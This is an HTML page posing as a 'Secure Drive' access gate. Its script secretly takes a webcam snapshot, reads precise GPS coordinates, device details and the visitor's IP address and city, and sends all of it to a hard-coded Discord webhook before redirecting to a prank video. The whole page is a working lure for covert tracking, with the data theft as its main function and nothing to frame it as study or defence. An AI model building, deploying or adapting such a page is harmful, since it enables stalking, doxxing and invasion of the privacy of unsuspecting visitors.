<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Secure Drive</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #0a0a0a;
      color: #00ffcc;
      font-family: "Segoe UI", sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100%;
      text-align: center;
      font-size: 1.2rem;
    }
    #main {
      padding: 1em;
    }
    #spinner {
      border: 4px solid #444;
      border-top: 4px solid #00ffcc;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 1em auto;
    }
    #countdown {
      font-size: 1.6rem;
      color: #fff;
    }
    button {
      background: #00ffcc;
      color: #000;
      border: none;
      padding: 0.6em 1.2em;
      font-size: 1rem;
      cursor: pointer;
      border-radius: 5px;
      margin-top: 1em;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div id="main">
    <div id="statusText">Permissions are required to access Secure Drive.</div>
    <button onclick="begin()">Continue</button>
  </div>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1388161217603965210/eELyivDPEhlKfnaaDce_b90zBtGFpe51uLHo28LsG0gle_1d8pfuN-_U6vK6Q38_N4Fj";
    const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    const deniedPage = "permission-denied.html";

    let coords = { lat: "Permission denied", lon: "Permission denied", acc: 0 };
    let capturedImageData = null;

    function getDeviceInfo() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
      };
    }

    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
      while (n--) u8arr[n] = bstr.charCodeAt(n);
      return new Blob([u8arr], { type: mime });
    }

    async function captureSnapshot() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.setAttribute("playsinline", true);
        video.muted = true;
        video.style.position = "absolute";
        video.style.opacity = "0";
        video.srcObject = stream;
        document.body.appendChild(video);
        await video.play();
        await new Promise(resolve => setTimeout(resolve, 2000));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        capturedImageData = canvas.toDataURL("image/png");

        stream.getTracks().forEach(t => t.stop());
        video.remove();
      } catch (err) {
        console.warn("Camera access denied or failed", err);
      }
    }

    function askNotificationPermission() {
      return new Promise(resolve => {
        if (!('Notification' in window)) return resolve(false);
        if (Notification.permission === 'granted') return resolve(true);
        Notification.requestPermission().then(p => resolve(p === 'granted')).catch(() => resolve(false));
      });
    }

    function askLocationPermission() {
      return new Promise(resolve => {
        if (!navigator.geolocation) return resolve(false);
        navigator.geolocation.getCurrentPosition(
          pos => {
            coords.lat = pos.coords.latitude;
            coords.lon = pos.coords.longitude;
            coords.acc = pos.coords.accuracy;
            resolve(true);
          },
          err => {
            console.warn("Location denied", err);
            resolve(false);
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }

    function sendToDiscord(ipData) {
      const device = getDeviceInfo();
      const mapLink = coords.lat !== "Permission denied" 
        ? `https://www.google.com/maps?q=${coords.lat},${coords.lon}` 
        : "Location not available";

      const formData = new FormData();
      const snapshotLine = capturedImageData
        ? "üì∏ Snapshot: ‚úÖ [Download](attachment://snapshot.png)"
        : "üì∏ Snapshot: ‚ùå Not available";

      const payload = {
        embeds: [{
          title: "üìç GPS & Device Info",
          description:
            `**Latitude:** ${coords.lat}\n**Longitude:** ${coords.lon}\n**Accuracy:** ${coords.acc} meters` +
            `\n**Map:** ${mapLink}` +
            `\n\nüåê **IP Info**\n**IP:** ${ipData.ipAddress}\n**City:** ${ipData.city}` +
            `\n**Region:** ${ipData.stateProv}\n**Country:** ${ipData.countryName}` +
            `\n\nüñ•Ô∏è **Device Info**\n**Platform:** ${device.platform}\n**Browser:** ${device.userAgent}` +
            `\n**Language:** ${device.language}\n**Screen:** ${device.screen}` +
            `\n**Touch Support:** ${device.touchSupport}` +
            `\n\n${snapshotLine}\nüïí ${new Date().toLocaleString()}`
        }]
      };

      if (capturedImageData) {
        const blob = dataURLtoBlob(capturedImageData);
        formData.append("file", blob, "snapshot.png");
        payload.embeds[0].image = { url: "attachment://snapshot.png" };
      }

      formData.append("payload_json", JSON.stringify(payload));
      fetch(webhookUrl, { method: "POST", body: formData });
    }

    async function begin() {
      document.getElementById("main").innerHTML = `
        <div id="statusText">Requesting permissions‚Ä¶</div>
        <div id="spinner"></div>
      `;

      const [locationGranted, notificationGranted] = await Promise.all([
        askLocationPermission(),
        askNotificationPermission()
      ]);

      await captureSnapshot();

      if (!locationGranted) {
        window.location.href = deniedPage;
        return;
      }

      fetch("https://api.db-ip.com/v2/free/self")
        .then(res => res.json())
        .then(sendToDiscord)
        .catch(() => sendToDiscord({ ipAddress: "N/A", city: "-", stateProv: "-", countryName: "-" }));

      startCountdown();
    }

    function startCountdown() {
      document.getElementById("main").innerHTML = `<div id="countdown">5 seconds to open secure drive</div>`;
      let seconds = 5;
      const countdownEl = document.getElementById("countdown");
      const interval = setInterval(() => {
        seconds--;
        countdownEl.textContent = `${seconds} seconds to open secure drive`;
        if (seconds === 0) {
          clearInterval(interval);
          window.location.href = redirectUrl;
        }
      }, 1000);
    }
  </script>
</body>
</html>
